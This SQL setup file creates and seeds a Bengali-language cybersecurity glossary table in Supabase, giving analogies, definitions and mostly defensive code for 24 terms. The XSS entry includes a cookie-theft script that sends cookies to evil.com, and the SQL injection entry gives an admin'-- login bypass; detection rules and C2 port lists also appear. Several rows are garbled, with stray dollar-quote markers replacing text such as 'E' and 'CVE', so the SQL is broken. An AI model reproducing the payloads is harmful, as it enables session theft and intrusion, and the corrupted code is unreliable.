-- ============================================================
-- CyberSec Dictionary — Supabase Setup SQL
-- Supabase Dashboard → SQL Editor → এই পুরো ফাইলটি paste করুন → Run
-- ============================================================

-- 1. TABLE তৈরি করুন
CREATE TABLE IF NOT EXISTS public.cyber_terms (
  id          SERIAL PRIMARY KEY,
  letter      CHAR(1)       NOT NULL,
  term        TEXT          NOT NULL UNIQUE,
  short       TEXT,
  analogy     TEXT,
  definition  TEXT,
  use_case    TEXT,
  example     TEXT,
  code        TEXT,
  tags        TEXT[]        DEFAULT '{}',
  risk        TEXT          CHECK (risk IN ('critical','high','medium','low')) DEFAULT 'medium',
  category    TEXT,
  image       TEXT,
  created_at  TIMESTAMPTZ   DEFAULT NOW(),
  updated_at  TIMESTAMPTZ   DEFAULT NOW()
);

-- 2. updated_at auto-update trigger
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN NEW.updated_at = NOW(); RETURN NEW; END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_updated_at ON public.cyber_terms;
CREATE TRIGGER trg_updated_at
  BEFORE UPDATE ON public.cyber_terms
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();

-- 3. ROW LEVEL SECURITY
ALTER TABLE public.cyber_terms ENABLE ROW LEVEL SECURITY;

-- Public read (anon key দিয়ে read করতে পারবে)
CREATE POLICY "Public read" ON public.cyber_terms
  FOR SELECT USING (true);

-- Only authenticated users can write (Admin panel থেকে)
CREATE POLICY "Auth write" ON public.cyber_terms
  FOR ALL USING (auth.role() = 'authenticated');

-- 4. Real-time subscription চালু করুন
ALTER PUBLICATION supabase_realtime ADD TABLE public.cyber_terms;

-- 5. Index for fast search
CREATE INDEX IF NOT EXISTS idx_cyber_terms_letter   ON public.cyber_terms (letter);
CREATE INDEX IF NOT EXISTS idx_cyber_terms_risk     ON public.cyber_terms (risk);
CREATE INDEX IF NOT EXISTS idx_cyber_terms_category ON public.cyber_terms (category);
CREATE INDEX IF NOT EXISTS idx_cyber_terms_tags     ON public.cyber_terms USING GIN (tags);

-- ============================================================
-- 6. SEED DATA — 24 Core Terms (80/20 Rule)
-- ============================================================
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES

('A','Authentication','পরিচয় যাচাই প্রক্রিয়া',
 '🔑 দরজার তালার মতো — সঠিক চাবি না দিলে ঢুকতে পারবে না।',
 'Authentication হলো এমন একটি প্রক্রিয়া যেখানে সিস্টেম নিশ্চিত করে যে ব্যবহারকারী সত্যিই সে-ই যে সে দাবি করছে। তিন ধরন: কিছু জানা (পাসওয়ার্ড), কিছু থাকা (OTP), বা কিছু হওয়া (বায়োমেট্রিক)।',
 'ব্যাংকিং অ্যাপে লগইন, OTP যাচাই, বায়োমেট্রিক স্ক্যান।',
 'Gmail-এ লগইন করতে সঠিক ইমেইল + পাসওয়ার্ড দিতে হয় — এটাই Authentication।',
 $code$// JWT Authentication (Node.js)
const jwt = require('jsonwebtoken');

const token = jwt.sign(
  { userId: 123, email: 'user@example.com' },
  process.env.JWT_SECRET,
  { expiresIn: '24h' }
);

jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
  if (err) return res.status(401).json({ error: 'Invalid token' });
  req.user = decoded;
  next();
});$code$,
 ARRAY['identity','login','JWT','OAuth','session'],
 'high','Identity',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('A','Authorization','অনুমতি নিয়ন্ত্রণ',
 '🏢 অফিসে ঢুকলেই সব রুমে যেতে পারবে না — শুধু অনুমোদিত এলাকায়।',
 'Authorization হলো Authentication-এর পরের ধাপ — কোন ব্যবহারকারী কোন রিসোর্সে অ্যাক্সেস পাবে তা নির্ধারণ। RBAC, ABAC ও DAC তিনটি প্রধান মডেল।',
 'Admin সব ডেটা দেখতে পারে, regular user শুধু নিজের ডেটা দেখতে পারে।',
 'হাসপাতাল সিস্টেমে ডাক্তার রোগীর রেকর্ড দেখতে পারেন, রিসেপশনিস্ট পারেন না।',
 $code$// RBAC Authorization (Node.js)
const checkRole = (required) => (req, res, next) => {
  const hierarchy = { admin: 3, doctor: 2, patient: 1 };
  if (hierarchy[req.user.role] >= hierarchy[required])
    return next();
  res.status(403).json({ error: 'Access Denied' });
};

app.get('/admin', authenticate, checkRole('admin'), handler);$code$,
 ARRAY['RBAC','access-control','permissions','ACL'],
 'high','Access Control',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('A','ARP Spoofing','নেটওয়ার্ক আইডেন্টিটি জালিয়াতি',
 '📮 কেউ যদি তোমার বাসার ঠিকানায় নিজের নাম লিখে চিঠি নেয় — সেটাই ARP Spoofing।',
 'ARP Spoofing হলো এমন আক্রমণ যেখানে attacker ভুয়া ARP বার্তা পাঠিয়ে নেটওয়ার্কে নিজেকে অন্য কারো হিসেবে দেখায়, ফলে সব ট্র্যাফিক তার মধ্য দিয়ে যায়।',
 'Man-in-the-Middle আক্রমণ, নেটওয়ার্ক ট্র্যাফিক intercept।',
 'কফিশপের WiFi-তে attacker নিজেকে রাউটার হিসেবে দেখিয়ে সবার ট্র্যাফিক পড়ছে।',
 $code$# ARP Spoofing সনাক্তকরণ (Python)
from scapy.all import ARP, sniff

def detect(pkt):
    if pkt[ARP].op == 2:
        real = getmacbyip(pkt[ARP].psrc)
        if real and real != pkt[ARP].hwsrc:
            print(f"⚠️ Spoofing! IP:{pkt[ARP].psrc}")

sniff(filter="arp", prn=detect, store=0)$code$,
 ARRAY['network','MITM','spoofing','LAN'],
 'critical','Network Attack',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('B','Botnet','সংক্রমিত কম্পিউটারের নেটওয়ার্ক',
 '🧟 জম্বি সেনাবাহিনীর মতো — লক্ষ কম্পিউটার অজান্তে হ্যাকারের নির্দেশে কাজ করছে।',
 'Botnet হলো malware-সংক্রমিত কম্পিউটারের নেটওয়ার্ক যা C&C (Command & Control) সার্ভার দ্বারা নিয়ন্ত্রিত।',
 'DDoS আক্রমণ, স্প্যাম ইমেইল, ক্রিপ্টোমাইনিং।',
 'Mirai Botnet ২০১৬ সালে ৬০০,০০০ IoT ডিভাইস দিয়ে মেজর সাইট ডাউন করে।',
 $code$# C2 Connection সনাক্তকরণ (Python)
import subprocess

def check_c2():
    result = subprocess.run(['netstat','-an'],
                          capture_output=True, text=True)
    c2_ports = [6667, 1337, 31337, 4444]
    for line in result.stdout.split('\n'):
        for port in c2_ports:
            if f':{port}' in line and 'ESTABLISHED' in line:
                print(f"🚨 Suspicious C2: {line.strip()}")

check_c2()$code$,
 ARRAY['malware','DDoS','C2','zombie','IoT'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('B','Brute Force Attack','পাসওয়ার্ড অনুমান করার আক্রমণ',
 '🔐 ৪ সংখ্যার তালা খুলতে ০০০০ থেকে ৯৯৯৯ সব চেষ্টা করা।',
 'Brute Force Attack হলো সব সম্ভাব্য পাসওয়ার্ড ক্রমানুসারে চেষ্টা করে সঠিকটি খুঁজে বের করার পদ্ধতি।',
 'দুর্বল পাসওয়ার্ড crack, PIN অনুমান, hash cracking।',
 'admin/admin, admin/password — বারবার লগইন চেষ্টা।',
 $code$// Rate Limiting (Express.js)
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many attempts. Retry in 15 min.' }
});

app.post('/login', limiter, loginHandler);$code$,
 ARRAY['password','attack','rate-limiting','lockout'],
 'high','Attack Vector',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('C','Cryptography','তথ্য এনক্রিপশনের বিজ্ঞান',
 '🔒 গোপন ভাষায় চিঠি লেখার মতো — শুধু প্রাপক পড়তে পারবে।',
 'Cryptography হলো তথ্যকে এমনভাবে রূপান্তর করার বিজ্ঞান যাতে শুধু অনুমোদিত পক্ষ পড়তে পারে। Symmetric (AES) ও Asymmetric (RSA) দুই ধরন।',
 'HTTPS, WhatsApp E2E encryption, ব্যাংক ট্র্যানজ্যাকশন।',
 'WhatsApp মেসেজ end-to-end encrypted — Meta-ও পড়তে পারে না।',
 $code$// AES-256-GCM Encryption (Node.js)
const crypto = require('crypto');
const KEY = crypto.randomBytes(32);

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', KEY, iv);
  const enc = c.update(text,'utf8','hex') + c.final('hex');
  return { enc, iv: iv.toString('hex'), tag: c.getAuthTag().toString('hex') };
}
console.log(encrypt("গোপন বার্তা"));$code$,
 ARRAY['AES','RSA','TLS','PKI','E2$code$],
 $code$medium','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('C','Cross-Site Scripting (XSS)','ওয়েবসাইটে ক্ষতিকর স্ক্রিপ্ট ইনজেকশন',
 '📝 পাবলিক নোটবোর্ডে ফাঁদ পেতে রাখল — যে পড়তে যাবে সে ক্ষতিগ্রস্ত।',
 'XSS হলো OWASP Top 10-এর অন্যতম — attacker ওয়েবসাইটে malicious JavaScript inject করে যা অন্য ব্যবহারকারীর ব্রাউজারে execute হয়।',
 'Session cookie চুরি, keylogging, redirect।',
 'কমেন্ট বক্সে <script>document.location=''evil.com?c=''+document.cookie</script>',
 $code$// XSS Prevention

// ❌ Vulnerable
element.innerHTML = userInput;

// ✅ Safe
element.textContent = userInput;

// ✅ DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// ✅ CSP Header
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'");$code$,
 ARRAY['web','injection','OWASP','DOM','CSP'],
 'critical','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('C','CSRF','ক্রস-সাইট রিকোয়েস্ট ফোরজারি',
 '✍️ তোমার হাত ধরে জোর করে চেক সাইন করানো — তুমি জানোও না।',
 'CSRF হলো এমন আক্রমণ যেখানে authenticated ব্যবহারকারীকে তার অজান্তে unwanted HTTP request করানো হয়।',
 'Bank transfer, পাসওয়ার্ড পরিবর্তন, account মুছে ফেলা।',
 'Bank-এ logged-in থাকলে ক্ষতিকর লিঙ্কে ক্লিক করলে টাকা চলে যায়।',
 $code$// CSRF Token (Express)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: { sameSite: 'strict' } });

app.get('/form', csrfProtection, (req, res) =>
  res.render('form', { csrfToken: req.csrfToken() })
);
app.post('/form', csrfProtection, handler);

// Cookie
res.cookie('session', token, {
  sameSite: 'strict', httpOnly: true, secure: true
});$code$,
 ARRAY['web','OWASP','token','cookies','SameSite'],
 'high','Web Security',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('D','DDoS Attack','বিতরণ করা সার্ভিস-বাধা আক্রমণ',
 '🚗 রাস্তায় হঠাৎ লক্ষ গাড়ি এলে যানজটে সব থেমে যাবে।',
 'DDoS (Distributed Denial of Service) হলো হাজার সিস্টেম থেকে একসাথে request পাঠিয়ে সার্ভারকে overwhelm করা। Volumetric, Protocol ও Application layer — তিন ধরন।',
 'প্রতিযোগী সাইট ডাউন করা, extortion, hacktivism।',
 'GitHub ২০২০ সালে ২.৫ Tbps DDoS সামলেছিল।',
 $code$# Nginx Rate Limiting
# /etc/nginx/nginx.conf

http {
  limit_conn_zone $binary_remote_addr zone=conn:10m;
  limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;

  server {
    limit_conn conn 20;
    limit_req zone=req burst=20 nodelay;
    client_body_timeout 10s;
  }
}
# Production: Cloudflare / AWS Shield ব্যবহার করুন$code$,
 ARRAY['network','availability','botnet','Cloudflare','CDN'],
 'critical','Network Attack',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('$code$,$code$Encryption','তথ্য সুরক্ষিত রূপান্তর',
 '📦 চিঠি বিশেষ বাক্সে তালা দিয়ে পাঠানো — শুধু চাবিওয়ালা খুলতে পারবে।',
 'Encryption হলো plaintext ডেটাকে cipher algorithm দিয়ে ciphertext-এ রূপান্তর করা। Symmetric-এ একই key, Asymmetric-এ public/private key pair।',
 'HTTPS, database encryption, file encryption, PGP email।',
 'WhatsApp মেসেজ Signal Protocol দিয়ে end-to-end encrypt।',
 $code$# Python Fernet Encryption
from cryptography.fernet import Fernet

key = Fernet.generate_key()
f = Fernet(key)

token = f.encrypt(b"sensitive data")
print("Encrypted:", token)

original = f.decrypt(token)
print("Decrypted:", original.decode())$code$,
 ARRAY['AES','RSA','TLS','E2$code$,$code$data-protection'],
 'medium','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('F','Firewall','নেটওয়ার্ক নিরাপত্তা প্রহরী',
 '🏰 দুর্গের দারোয়ান — নিয়ম মেনে কেউ ঢুকতে পারবে, বাকি ব্লক।',
 'Firewall হলো predefined rules অনুযায়ী incoming/outgoing ট্র্যাফিক নিয়ন্ত্রণকারী সিস্টেম। Packet Filter, Stateful, WAF — তিন ধরন।',
 'Unauthorized access ব্লক, port scanning প্রতিরোধ।',
 'কর্পোরেট ফায়ারওয়াল সোশ্যাল মিডিয়া ব্লক রেখেছে।',
 $code$# iptables Firewall Rules

iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -s 203.0.113.0/24 -j ACCEPT$code$,
 ARRAY['network','iptables','WAF','packet-filter'],
 'low','Defense',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('H','Hashing','একমুখী ডেটা রূপান্তর',
 '🍎 আপেলকে জুস বানালে আর আপেল ফেরত পাওয়া যায় না।',
 'Hashing হলো একমুখী ক্রিপ্টোগ্রাফিক ফাংশন যা যেকোনো ইনপুটকে নির্দিষ্ট দৈর্ঘ্যের hash-এ রূপান্তর করে। SHA-256, bcrypt, Argon2 জনপ্রিয়।',
 'পাসওয়ার্ড স্টোরেজ, ফাইল integrity যাচাই, digital signature।',
 'ডেটাবেসে পাসওয়ার্ড কখনো plaintext রাখা হয় না — bcrypt hash হিসেবে।',
 $code$// bcrypt (Node.js)
const bcrypt = require('bcrypt');

async function hashPassword(plain) {
  return bcrypt.hash(plain, 12); // 12 rounds
}

async function verify(plain, hash) {
  return bcrypt.compare(plain, hash);
}

// SHA-256 (Python)
import hashlib
print(hashlib.sha256(b"data").hexdigest())$code$,
 ARRAY['SHA-256','bcrypt','Argon2','integrity','password'],
 'low','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('I','IDS / IPS','অনুপ্রবেশ সনাক্তকরণ ও প্রতিরোধ',
 '🚨 বাড়ির অ্যালার্ম (IDS) — এবং স্বয়ংক্রিয় দরজা লক (IPS)।',
 'IDS (Intrusion Detection System) সন্দেহজনক কার্যকলাপ সনাক্ত করে alert পাঠায়। IPS (Intrusion Prevention System) সক্রিয়ভাবে ব্লকও করে।',
 'Zero-day সনাক্ত, insider threat মনিটর, compliance logging।',
 'Snort IDS রাত ৩টায় port scan সনাক্ত করে admin-কে email পাঠালো।',
 $code$# Snort IDS Rule
# /etc/snort/rules/local.rules

alert tcp any any -> $HOME_NET any (
  msg:"Port Scan Detected";
  flags:S;
  threshold: type both, track by_src,
             count 20, seconds 60;
  sid:1000001;
)

alert http any any -> $HTTP_SERVERS any (
  msg:"SQL Injection";
  content:"OR 1=1";
  http_uri;
  sid:1000002;
)$code$,
 ARRAY['monitoring','SIEM','Snort','Suricata','anomaly'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('M','Malware','ক্ষতিকর সফটওয়্যার',
 '🦠 কম্পিউটার ভাইরাস ঠিক জৈবিক ভাইরাসের মতো — ছড়ায়, ক্ষতি করে।',
 'Malware (Malicious Software) হলো ক্ষতির জন্য তৈরি সফটওয়্যার। Virus, Worm, Trojan, Ransomware, Spyware, Adware, Rootkit — বিভিন্ন ধরন।',
 'ডেটা চুরি, সিস্টেম ধ্বংস, cryptomining।',
 'WannaCry ২০১৭ সালে ১৫০ দেশের লক্ষ কম্পিউটার encrypt করে।',
 $code$# Static Malware Analysis
import hashlib, re

def analyze(path):
    with open(path, 'rb') as f: data = f.read()
    sha = hashlib.sha256(data).hexdigest()
    print(f"SHA256: {sha}")
    print(f"VT: https://virustotal.com/gui/file/{sha}")
    
    patterns = ['cmd.exe','powershell','base64','http://']
    text = data.decode('utf-8', errors='ignore')
    for p in patterns:
        if p.lower() in text.lower():
            print(f"⚠️ Found: {p}")

analyze('suspicious.exe')$code$,
 ARRAY['virus','ransomware','trojan','spyware','rootkit'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('M','Man-in-the-Middle (MITM)','মাঝখানে বসে তথ্য আটকানো',
 '📬 পোস্টম্যান চিঠি পড়ে, কপি করে, তারপর পাঠায় — কেউ জানে না।',
 'MITM আক্রমণে attacker দুটি পক্ষের যোগাযোগে গোপনে প্রবেশ করে ডেটা পড়ে বা পরিবর্তন করে।',
 'Public WiFi-তে credential চুরি, session hijacking।',
 'কফিশপে ফ্রি WiFi-তে ব্যাংকিং তথ্য intercept হচ্ছে।',
 $code$// MITM Prevention

// 1. Always verify SSL
const https = require('https');
// verify: true (default)

// 2. HSTS Header (Express)
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});

// 3. Force HTTPS
if (!req.secure) res.redirect(301, 'https://' + req.headers.host + req.url);$code$,
 ARRAY['network','SSL','HSTS','certificate','WiFi'],
 'critical','Network Attack',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('N','Network Scanning','নেটওয়ার্ক রিকনেসাঁস পদ্ধতি',
 '🗺️ কোনো এলাকায় যাওয়ার আগে সব বাড়ির দরজা-জানালা চেক করা।',
 'Network Scanning হলো নেটওয়ার্কে active hosts, open ports ও services সনাক্ত করার প্রক্রিয়া। Penetration testing-এর প্রথম ধাপ।',
 'Vulnerability assessment, asset inventory।',
 'Nmap দিয়ে নেটওয়ার্কে কোন port খোলা আছে দেখা।',
 $code$# Nmap Network Scanning

# Service & Version detection
nmap -sV -sC 192.168.1.0/24

# Full port scan
nmap -p- 192.168.1.1

# Vuln scan
nmap --script vuln 192.168.1.1

# Python port scanner
import socket
def scan(host, ports):
    return [p for p in ports
            if not socket.socket().connect_ex((host,p))]
print(scan('192.168.1.1', range(1,1025)))$code$,
 ARRAY['Nmap','recon','port-scan','OSINT','pentest'],
 'medium','Reconnaissance',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('O','OWASP Top 10','সবচেয়ে বিপজ্জনক ওয়েব নিরাপত্তা ঝুঁকি',
 '🏆 ওয়েব সিকিউরিটির Most Wanted তালিকা।',
 'OWASP Top 10 হলো সবচেয়ে গুরুতর ওয়েব অ্যাপ্লিকেশন নিরাপত্তা ঝুঁকির তালিকা, প্রতি ৩-৪ বছরে আপডেট হয়।',
 'Secure development checklist, security audit baseline।',
 'OWASP 2021: A01-Broken Access Control, A02-Cryptographic Failures, A03-Injection।',
 $code$// OWASP Top 10 (2021)
const owasp = [
  { rank:"A01", name:"Broken Access Control",    fix:"RBAC, least privilege" },
  { rank:"A02", name:"Cryptographic Failures",   fix:"TLS 1.3, AES-256" },
  { rank:"A03", name:"Injection",                fix:"Parameterized queries" },
  { rank:"A04", name:"Insecure Design",          fix:"Threat modeling" },
  { rank:"A05", name:"Security Misconfiguration",fix:"Hardening guides" },
  { rank:"A06", name:"Vulnerable Components",    fix:"SCA, patch regularly" },
  { rank:"A07", name:"Auth Failures",            fix:"MFA, strong passwords" },
  { rank:"A08", name:"Integrity Failures",       fix:"Code signing, SAST" },
  { rank:"A09", name:"Logging Failures",         fix:"SIEM, audit logs" },
  { rank:"A10", name:"SSRF",                     fix:"Allowlist, firewall" },
];$code$,
 ARRAY['web','standards','checklist','SAST','compliance'],
 'high','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('P','Phishing','প্রতারণামূলক পরিচয়ে তথ্য চুরি',
 '🎣 ভুয়া미끼দিয়ে মাছ ধরার মতো — ব্যবহারকারী কামড় দিলেই ধরা।',
 'Phishing হলো বৈধ সংস্থার ছদ্মবেশে sensitive তথ্য দিতে প্রতারণা। Spear Phishing, Whaling, Vishing variant।',
 'Login credentials চুরি, credit card তথ্য, malware।',
 '''Your bank account will be closed'' ইমেইলের লিঙ্ক fake সাইটে নিয়ে যায়।',
 $code$// Phishing Domain Check
const dns = require('dns').promises;

async function checkDomain(domain) {
  const result = { spf:false, dmarc:false, fake:false };
  try {
    const spf = await dns.resolveTxt(domain);
    result.spf = spf.flat().some(r => r.includes('v=spf1'));
  } catch {}
  const fakes = ['paypa1','g00gle','amaz0n'];
  result.fake = fakes.some(f => domain.includes(f));
  return result;
}
checkDomain('paypa1.com').then(console.log);$code$,
 ARRAY['social-engineering','email','spear-phishing','vishing'],
 'critical','Social Engineering',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('R','Ransomware','ডেটা জিম্মি করে মুক্তিপণ দাবি',
 '🏴‍☠️ সব ফাইল তালাবন্ধ করে চাবির বিনিময়ে Bitcoin চাইছে।',
 'Ransomware হলো malware যা ভিকটিমের ফাইল encrypt করে Bitcoin মুক্তিপণ দাবি করে। RaaS (Ransomware-as-a-Service) এখন সহজলভ্য।',
 'হাসপাতাল, স্কুল, সরকারি সংস্থা — বড় প্রতিষ্ঠান টার্গেট।',
 'Colonial Pipeline ২০২১ সালে $4.4M Bitcoin মুক্তিপণ দিতে বাধ্য।',
 $code$# 3-2-1 Backup Strategy
import os, shutil, datetime, hashlib

def backup(src, dst):
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    bk = os.path.join(dst, f'backup_{ts}')
    shutil.copytree(src, bk)
    
    manifest = {}
    for root,_,files in os.walk(bk):
        for f in files:
            fp = os.path.join(root,f)
            with open(fp,'rb') as fh:
                manifest[fp]=hashlib.sha256(fh.read()).hexdigest()
    print(f"✅ {len(manifest)} files backed up")

# 3 copies, 2 media types, 1 offsite
backup('/data','/backup/local')$code$,
 ARRAY['malware','encryption','bitcoin','backup','RaaS'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('S','SQL Injection','ডেটাবেসে ক্ষতিকর কোড ঢোকানো',
 '📋 ফর্মে নাম লেখার জায়গায় কমান্ড লিখলে পুরো ডেটাবেস ফাঁকি।',
 'SQL Injection হলো OWASP #3 — input ফিল্ডে malicious SQL inject করে unauthorized ডেটাবেস অ্যাক্সেস।',
 'Login bypass, সব ডেটা dump, admin access।',
 $code$Username: admin'-- দিলে পাসওয়ার্ড ছাড়াই লগইন।$code$,
 $code$// SQL Injection Prevention

// ❌ Vulnerable
const q = `SELECT * FROM users WHERE name='${input}'`;

// ✅ Parameterized (mysql2)
const [rows] = await db.execute(
  'SELECT * FROM users WHERE username=? AND pwd=?',
  [username, hashedPwd]
);

// ✅ ORM (Prisma)
const user = await prisma.user.findFirst({
  where: { username, password: hashedPwd }
});$code$,
 ARRAY['database','injection','OWASP','MySQL','PostgreSQL'],
 'critical','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('S','Social Engineering','মানুষকে manipulate করার কৌশল',
 '🎭 অভিনেতার মতো অন্য পরিচয়ে বিশ্বাস করিয়ে তথ্য নেওয়া।',
 'Social Engineering হলো মানুষের মনোবিজ্ঞান exploit করে তাদের confidential তথ্য দিতে বা নিরাপত্তা ভাঙতে manipulate করা।',
 'IT সাপোর্টে ফোন করে পাসওয়ার্ড রিসেট, boss সেজে fund transfer।',
 'Kevin Mitnick — বিশ্বের বিখ্যাত হ্যাকার, বেশিরভাগ hack ছিল social engineering।',
 $code$// SE Red Flags Detection
const flags = {
  urgency:   "এখনই করতে হবে!",
  authority: "আমি CEO বলছি",
  fear:      "না করলে account বন্ধ",
  scarcity:  "শুধু আজকের জন্য"
};

function detectSE(msg) {
  const found = Object.keys(flags)
    .filter(k => msg.toLowerCase().includes(k));
  return {
    riskLevel: found.length,
    action: found.length > 1
      ? "🚨 Verify through official channel!"
      : "ℹ️ Proceed with caution"
  };
}$code$,
 ARRAY['human-factor','pretexting','vishing','baiting'],
 'high','Social Engineering',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('T','Two-Factor Authentication (2FA)','দুই স্তরের পরিচয় যাচাই',
 '🏧 ATM-এ কার্ড + PIN দুটোই লাগে — একটা হলে হয় না।',
 '2FA (MFA) হলো দুটি আলাদা factor দিয়ে পরিচয় যাচাই: কিছু জানা (পাসওয়ার্ড) + কিছু থাকা (OTP/hardware key) বা কিছু হওয়া (biometric)।',
 'Gmail, Facebook, bank — গুরুত্বপূর্ণ সব অ্যাকাউন্টে অবশ্যই।',
 'পাসওয়ার্ড দেওয়ার পরেও Authenticator app-এর OTP লাগে।',
 $code$// TOTP 2FA (Node.js + speakeasy)
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

async function setup2FA(userId, email) {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${email})`, length: 20
  });
  const qr = await QRCode.toDataURL(secret.otpauth_url);
  // Supabase-এ save করুন:
  await supabase.from('users').update({ totp: secret.base32 }).eq('id',userId);
  return { qr };
}

function verify(secret, token) {
  return speakeasy.totp.verify({ secret, encoding:'base32', token, window:2 });
}$code$,
 ARRAY['MFA','TOTP','OTP','authenticator','hardware-key'],
 'low','Defense',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('V','VPN','ভার্চুয়াল প্রাইভেট নেটওয়ার্ক',
 '🚇 খোলা রাস্তায় গোপন সুড়ঙ্গ দিয়ে যাওয়া — কেউ দেখতে পাচ্ছে না।',
 'VPN একটি এনক্রিপ্টেড টানেল তৈরি করে ট্র্যাফিককে দূরবর্তী সার্ভারের মাধ্যমে route করে — IP লুকায়, ডেটা এনক্রিপ্ট করে।',
 'Public WiFi নিরাপত্তা, geo-block bypass, remote work।',
 'WireGuard VPN দিয়ে বাড়ি থেকে অফিস নেটওয়ার্কে secure access।',
 $code$# WireGuard VPN Setup

# Keys generate করুন
wg genkey | tee server.key | wg pubkey > server.pub
wg genkey | tee client.key | wg pubkey > client.pub

# /etc/wireguard/wg0.conf
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

wg-quick up wg0
systemctl enable wg-quick@wg0$code$,
 ARRAY['privacy','tunnel','OpenVPN','WireGuard','remote'],
 'low','Defense',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('Z','Zero-Day Vulnerability','অজানা নিরাপত্তা ত্রুটি',
 '🕳️ বাড়িতে গোপন সুড়ঙ্গ — মালিক জানে না কিন্তু চোর জানে।',
 'Zero-Day হলো এমন vulnerability যা vendor জানে না বা patch বের করেনি। Nation-state actors ও APT গ্রুপ এগুলো exploit করে।',
 'Nation-state hacking, APT attacks, Stuxnet-এর মতো cyberweapon।',
 'Stuxnet ৪টি zero-day ব্যবহার করে ইরানের nuclear centrifuge ধ্বংস করেছিল।',
 $code$// Zero-Day Defense: Zero Trust

const zeroTrust = {
  // Never Trust, Always Verify
  verify: async (req) => {
    const checks = await Promise.all([
      verifyIdentity(req.user),
      checkDeviceHealth(req.device),
      validateLocation(req.ip),
      checkBehavior(req.user, req.action)
    ]);
    return checks.every(c => c.passed);
  },
  // Subscribe threat intel feeds
  feeds: ['NVD', 'MITRE ATT&CK', 'CVE Database']
};

// Virtual Patching (WAF) while vendor patches$code$,
 ARRAY['CV$code$,$code$exploit','APT','zero-trust','patch'],
 'critical','Vulnerability',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80')

ON CONFLICT (term) DO NOTHING;

-- ============================================================
-- VERIFY: সব ঠিকমতো insert হয়েছে কিনা দেখুন
-- ============================================================
SELECT letter, term, risk, category FROM public.cyber_terms ORDER BY letter, term;
